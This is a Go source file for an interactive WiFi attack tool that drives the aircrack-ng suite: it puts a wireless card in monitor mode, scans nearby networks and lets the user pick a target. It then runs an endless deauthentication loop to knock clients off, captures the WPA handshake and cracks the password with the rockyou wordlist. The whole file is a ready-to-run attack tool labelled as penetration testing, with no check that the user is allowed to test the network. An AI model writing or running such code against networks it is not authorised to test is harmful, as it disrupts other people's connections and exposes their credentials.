package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// Network represents a WiFi network
type Network struct {
	ID      int
	BSSID   string
	ESSID   string
	Channel string
	Signal  string
}

func main() {
	// Clear screen for a fresh start
	fmt.Print("\033[H\033[2J")

	// Cyan color for the banner
	fmt.Println("\033[1;36m")
	fmt.Println(`
 __          ___ ______ _    _  _   _            _    
 \ \        / (_)  ____(_)  | || | | |          | |   
  \ \  /\  / / _| |__   _   | || | | | __ _  ___| | __
   \ \/  \/ / | |  __| | |  | || |_| |/ _` + "`" + ` |/ __| |/ /
    \  /\  /  | | |    | |  |__   _| | (_| | (__|   < 
     \/  \/   |_|_|    |_|     |_| |_|\__,_|\___|_|\_\
                                                      
       [ WiFi Penetration Testing Tool ]
           [ Created by Abdelaziz ]
        [ (c) 2026 - All Rights Reserved ]
`)
	fmt.Println("\033[0m")

	// Step 1: Kill conflicting processes
	killConflictingProcesses()

	// Step 2: Get available interfaces
	interfaceName := selectInterface()
	if interfaceName == "" {
		log.Fatal("No interface selected. Exiting.")
	}

	// Step 3: Enable monitor mode
	monitorInterface := enableMonitorMode(interfaceName)

	// Step 4: Scan for networks
	fmt.Println("\n[+] Scanning for networks...")
	networks := scanNetworks(monitorInterface)
	if len(networks) == 0 {
		log.Fatal("No networks found. Exiting.")
	}

	// Step 5: Select target network
	targetNetwork := selectTargetNetwork(networks)

	// Step 6: Capture handshake
	fmt.Printf("\n[+] Targeting network: %s (%s)\n", targetNetwork.ESSID, targetNetwork.BSSID)
	captureFile := captureHandshake(monitorInterface, targetNetwork)

	// Step 7: Stop monitor mode
	stopMonitorMode(monitorInterface)

	// Step 8: Automatically start cracking (handshake already detected)
	fmt.Println("\n[+] Handshake captured! Starting password crack...")
	crackPassword(captureFile)

	fmt.Println("\n[+] Process completed!")
}

func killConflictingProcesses() {
	fmt.Println("[+] Checking for conflicting processes...")

	cmd := exec.Command("sudo", "airmon-ng", "check", "kill")
	fmt.Printf("[CMD] %s\n", cmd.String())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error killing processes: %v\n", err)
	}

	time.Sleep(2 * time.Second)
	fmt.Println("[✓] Conflicting processes terminated")
}

func selectInterface() string {
	fmt.Println("\n[+] Available network interfaces:")

	cmd := exec.Command("iwconfig")
	fmt.Printf("[CMD] %s\n", cmd.String())
	output, err := cmd.Output()
	if err != nil {
		log.Fatal("Error getting interfaces: ", err)
	}

	lines := strings.Split(string(output), "\n")
	var interfaces []string

	for _, line := range lines {
		if strings.Contains(line, "IEEE 802.11") && !strings.Contains(line, "no wireless") {
			parts := strings.Fields(line)
			if len(parts) > 0 {
				interfaces = append(interfaces, parts[0])
			}
		}
	}

	if len(interfaces) == 0 {
		fmt.Println("[-] No wireless interfaces found")
		return ""
	}

	for i, iface := range interfaces {
		fmt.Printf("  %d. %s\n", i+1, iface)
	}

	fmt.Print("\nSelect interface number: ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(interfaces) {
		fmt.Println("[-] Invalid selection")
		return ""
	}

	return interfaces[choice-1]
}

func enableMonitorMode(interfaceName string) string {
	fmt.Printf("\n[+] Enabling monitor mode on %s...\n", interfaceName)

	cmd := exec.Command("sudo", "airmon-ng", "start", interfaceName)
	fmt.Printf("[CMD] %s\n", cmd.String())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatal("Error enabling monitor mode: ", err)
	}

	time.Sleep(2 * time.Second)

	// Check if interface name changed to *mon
	// Some distros use wlan0mon, others keep wlan0
	// We'll check iwconfig for the mon version
	monName := interfaceName + "mon"

	// Quick check if mon exists
	cmdCheck := exec.Command("iwconfig", monName)
	if err := cmdCheck.Run(); err == nil {
		fmt.Printf("[✓] Monitor mode enabled on %s\n", monName)
		return monName
	}

	// Fallback to original
	fmt.Printf("[✓] Monitor mode enabled on %s (name unchanged)\n", interfaceName)
	return interfaceName
}

func scanNetworks(monitorInterface string) []Network {
	fmt.Println("\n[+] Scanning networks...")
	fmt.Println("[i] Press 's' and Enter to stop scanning when ready")

	// Local file prefix
	cwd, _ := os.Getwd()
	tmpPrefix := cwd + "/list"
	csvFile := tmpPrefix + "-01.csv"

	// Cleanup previous scans
	files, _ := os.ReadDir(cwd)
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "list-") {
			os.Remove(f.Name())
		}
	}

	// Run airodump-ng in background, outputting to CSV
	cmd := exec.Command("sudo", "airodump-ng",
		"--output-format", "csv",
		"-w", tmpPrefix,
		// Update interval 1s
		"--write-interval", "1",
		monitorInterface)

	fmt.Printf("[CMD] %s\n", cmd.String())

	// Capture stderr to debug startup failures
	var stderr bytes.Buffer
	cmd.Stdout = nil
	cmd.Stderr = &stderr

	if err := cmd.Start(); err != nil {
		log.Fatal("Error starting scan: ", err)
	}

	// UI Updater Goroutine
	stopUI := make(chan bool)
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-stopUI:
				return
			case <-ticker.C:
				// Clear screen
				fmt.Print("\033[H\033[2J")
				fmt.Printf("[CMD] %s\n", cmd.String()) // Reprint command for context
				fmt.Println("\n[+] Scanning networks... (Press 's' and Enter to stop)")

				// Check process state
				if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
					fmt.Println("[-] Scanner process died unexpectedly:")
					fmt.Println(stderr.String())
					return
				}

				// Check file existence
				if _, err := os.Stat(csvFile); os.IsNotExist(err) {
					fmt.Printf("[*] Waiting for scan file (%s)...\n", csvFile)
					if stderr.Len() > 0 {
						fmt.Printf("Debug output: %s\n", stderr.String())
					}
				} else {
					// Try to parse CSV
					currentNetworks, err := parseAirodumpCSV(csvFile)
					if err != nil {
						fmt.Printf("[!] Error parsing CSV: %v\n", err)
					} else if len(currentNetworks) == 0 {
						fmt.Println("[*] File found, but no networks parsed yet...")
					} else {
						printNetworkTable(currentNetworks)
					}
				}
				fmt.Print("\n> ") // Input prompt
			}
		}
	}()

	// Wait for user input to stop
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text == "s" || text == "S" {
			break
		}
	}

	// Stop UI updater
	stopUI <- true
	time.Sleep(500 * time.Millisecond) // Give time for UI goroutine to exit

	// Kill the process
	cmd.Process.Kill()
	cmd.Wait()

	// Parse the final CSV
	networks, err := parseAirodumpCSV(csvFile)
	if err != nil {
		fmt.Printf("\n[-] Error parsing scan results (%s): %v\n", csvFile, err)
		return []Network{}
	}

	// Cleanup
	os.Remove(csvFile)

	return networks
}

func printNetworkTable(networks []Network) {
	fmt.Println("┌────┬────────────────────┬──────────────┬─────────┬────────┐")
	fmt.Println("│ ID │ BSSID              │ ESSID        │ Channel │ Signal │")
	fmt.Println("├────┼────────────────────┼──────────────┼─────────┼────────┤")

	for _, net := range networks {
		// Truncate ESSID if too long
		essid := net.ESSID
		if len(essid) > 12 {
			essid = essid[:12]
		}
		fmt.Printf("│ %2d │ %17s │ %-12s │ %7s │ %6s │\n",
			net.ID, net.BSSID, essid, net.Channel, net.Signal)
	}
	fmt.Println("└────┴────────────────────┴──────────────┴─────────┴────────┘")
}

func parseAirodumpCSV(filename string) ([]Network, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)

	// Airodump CSV has two sections. We only want the first (AP) section.
	// It starts with headers.
	// BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key

	// Example parsed line needs to ensure we hit the right columns.
	// BSSID is col 0, Channel is col 3, Power (Signal) is col 8, ESSID is col 13

	idCounter := 1
	hasHeader := false

	for scanner.Scan() {
		line := scanner.Text()

		// Section separator check
		if strings.TrimSpace(line) == "" || strings.HasPrefix(line, "Station MAC") {
			if len(networks) > 0 {
				break // Stop processing when we hit clients section
			}
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		// Clean tokens
		for i := range parts {
			parts[i] = strings.TrimSpace(parts[i])
		}

		if parts[0] == "BSSID" {
			hasHeader = true
			continue
		}

		if !hasHeader {
			continue // Skip until we find header
		}

		// Parse fields
		bssid := parts[0]
		channel := parts[3]
		signal := parts[8]
		essid := parts[13]

		// Filter out empty lines or invalid rows
		if bssid == "" || essid == "" {
			continue
		}

		networks = append(networks, Network{
			ID:      idCounter,
			BSSID:   bssid,
			ESSID:   essid,
			Channel: channel,
			Signal:  signal,
		})
		idCounter++
	}

	return networks, scanner.Err()
}

func selectTargetNetwork(networks []Network) Network {
	fmt.Println("\n[+] Available Networks:")
	printNetworkTable(networks)

	fmt.Print("\nSelect target network ID: ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	choice, err := strconv.Atoi(input)
	if err != nil || choice < 1 || choice > len(networks) {
		log.Fatal("Invalid network selection")
	}

	return networks[choice-1]
}

func captureHandshake(monitorInterface string, target Network) string {
	captureFile := "handshake_capture"
	channel := target.Channel
	if channel == "" {
		channel = "1"
	}

	fmt.Printf("\n[+] Capturing handshake on channel %s...\n", channel)
	fmt.Println("[+] Continuously deauthenticating clients until handshake is captured...")
	fmt.Println("[!] This may take a few minutes.")
	fmt.Println("[!] Press 's' and Enter at any time to stop capture and proceed to cracking.")

	// Start capture in background
	cmd := exec.Command("sudo", "airodump-ng",
		"-w", captureFile,
		"-c", channel,
		"--bssid", target.BSSID,
		monitorInterface)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	fmt.Println("[+] Starting airodump-ng capture...")
	fmt.Println("[+] You will see live capture output below:\n")

	// Show all output from airodump-ng
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		log.Fatalf("[-] Failed to start capture: %v", err)
	}

	// Start deauth immediately (removed delay) for concurrency
	// Continuous deauth loop until handshake is captured
	handshakeDetected := make(chan bool, 1)
	stopDeauth := make(chan bool, 1)

	// Start continuous deauth attack
	go func() {
		fmt.Println("\n[+] Starting continuous deauth attack...")
		deauthCount := 0
		for {
			select {
			case <-stopDeauth:
				fmt.Println("\n[+] Stopping deauth attacks...")
				return
			default:
				deauthCount++
				fmt.Printf("\n[*] Deauth attempt #%d (sending 5 packets)...\n", deauthCount)
				if err := deauthClients(monitorInterface, target.BSSID, 5); err != nil {
					fmt.Printf("[-] Deauth error (attempt #%d): %v\n", deauthCount, err)
				} else {
					fmt.Printf("[✓] Deauth attempt #%d completed successfully\n", deauthCount)
				}
				// Wait before next deauth attempt
				fmt.Printf("[*] Waiting 3 seconds before next deauth attempt...\n")
				time.Sleep(3 * time.Second)
			}
		}
	}()

	// Monitor for handshake detection
	go func() {
		capFileName := captureFile + "-01.cap"
		checkInterval := 5 * time.Second
		ticker := time.NewTicker(checkInterval)
		defer ticker.Stop()
		checkCount := 0

		for {
			select {
			case <-stopDeauth:
				return // Stop checking if deauth/capture is stopped
			case <-ticker.C:
				checkCount++
				// Don't clutter UI too much, but show we are alive
				// fmt.Printf("\n[*] Handshake check #%d...\n", checkCount)

				// Check if capture file exists
				if _, err := os.Stat(capFileName); err == nil {
					if hasHandshake(capFileName, target.BSSID) {
						fmt.Println("\n[✓] WPA handshake detected by auto-scan!")
						handshakeDetected <- true
						return
					}
				}
			}
		}
	}()

	// Listen for user manual stop ('s')
	userStopped := make(chan bool, 1)
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			text := strings.TrimSpace(scanner.Text())
			if text == "s" || text == "S" {
				userStopped <- true
				return
			}
		}
	}()

	// Wait for handshake detection, user stop, or timeout
	timeout := time.After(10 * time.Minute)

	// Helper to cleanup
	cleanup := func() {
		stopDeauth <- true // Signals deauth loop and handshake checker to stop
		time.Sleep(1 * time.Second)
		if cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}

	select {
	case <-handshakeDetected:
		cleanup()
		fmt.Println("[✓] Capture stopped via auto-detection.")
		return captureFile + "-01.cap"

	case <-userStopped:
		fmt.Println("\n[!] User manually stopped capture.")
		cleanup()
		return captureFile + "-01.cap"

	case <-timeout:
		cleanup()
		log.Fatal("[-] Timeout: No handshake captured after 10 minutes.")
		return ""
	}
}

func deauthClients(monitorInterface, bssid string, count int) error {
	cmd := exec.Command("sudo", "aireplay-ng",
		"--deauth", strconv.Itoa(count),
		"-a", bssid,
		monitorInterface)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))

	// Show all output from aireplay-ng
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("deauth failed: %w", err)
	}
	return nil
}

// hasHandshake checks if a WPA handshake exists in the capture file
func hasHandshake(capFile, bssid string) bool {
	// Use aircrack-ng to check if handshake exists
	// -a 2 = WPA, -b = BSSID filter, -w /dev/null = no wordlist (just check)
	cmd := exec.Command("sudo", "aircrack-ng",
		"-a", "2",
		"-b", bssid,
		"-w", "/dev/null",
		capFile)

	fmt.Printf("[CMD] %s\n", strings.Join(cmd.Args, " "))
	fmt.Println("[*] Running aircrack-ng to check for handshake...")

	// Capture output to check for handshake, but also show it
	var stdout bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &stdout)
	cmd.Stderr = os.Stderr

	// Run command (will exit quickly since no wordlist)
	err := cmd.Run()

	// Check output for handshake indicators
	output := stdout.String()

	fmt.Printf("[*] aircrack-ng check completed. Exit code: %v\n", err)
	fmt.Printf("[*] Output analysis: checking for handshake indicators...\n")

	// aircrack-ng output contains "1 handshake" when found
	// Exit code 0 typically means handshake found, but check output to be sure
	if strings.Contains(output, "1 handshake") {
		fmt.Println("[✓] Found '1 handshake' in output - handshake detected!")
		return true
	}

	// Also check for "0 handshake" to explicitly know it's not found
	if strings.Contains(output, "0 handshake") {
		fmt.Println("[*] Found '0 handshake' in output - no handshake yet")
		return false
	}

	// If exit code is 0 and we have output mentioning handshake, assume found
	if err == nil && strings.Contains(output, "handshake") {
		fmt.Println("[✓] Exit code 0 and handshake mentioned - handshake detected!")
		return true
	}

	fmt.Println("[*] No handshake detected in this check")
	return false
}

func stopMonitorMode(monitorInterface string) {
	fmt.Println("\n[+] Stopping monitor mode...")

	cmd := exec.Command("sudo", "airmon-ng", "stop", monitorInterface)
	fmt.Printf("[CMD] %s\n", cmd.String())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error stopping monitor mode: %v\n", err)
	} else {
		fmt.Println("[✓] Monitor mode stopped")
	}

	// Restart NetworkManager
	fmt.Println("[+] Restarting NetworkManager...")
	cmd = exec.Command("sudo", "systemctl", "start", "NetworkManager")
	fmt.Printf("[CMD] %s\n", cmd.String())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Error starting NetworkManager: %v\n", err)
	} else {
		fmt.Println("[✓] NetworkManager restarted")
	}
}

func crackPassword(capFile string) {
	// Check if rockyou.txt exists
	wordlist := "/usr/share/wordlists/rockyou.txt"

	// Check if rockyou is gzipped
	if _, err := os.Stat(wordlist + ".gz"); err == nil {
		fmt.Println("[+] Found gzipped rockyou.txt, extracting...")
		cmd := exec.Command("gunzip", "-k", wordlist+".gz")
		fmt.Printf("[CMD] %s\n", cmd.String())
		if err := cmd.Run(); err != nil {
			fmt.Printf("[-] Error extracting wordlist: %v\n", err)
			return
		}
	}

	if _, err := os.Stat(wordlist); os.IsNotExist(err) {
		fmt.Println("[-] Wordlist not found. Install it with:")
		fmt.Println("    sudo apt install wordlists")
		fmt.Println("    or download from: https://github.com/brannondorsey/naive-hashcat/releases")
		return
	}

	if _, err := os.Stat(capFile); os.IsNotExist(err) {
		fmt.Printf("[-] Capture file %s not found\n", capFile)
		return
	}

	fmt.Println("\n[+] Starting password crack...")
	fmt.Println("    This may take a while depending on wordlist size")
	fmt.Println("    Press Ctrl+C to abort\n")

	cmd := exec.Command("sudo", "aircrack-ng",
		capFile,
		"-w", wordlist)

	fmt.Printf("[CMD] %s\n", cmd.String())
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		fmt.Printf("[-] Cracking error: %v\n", err)
	}
}
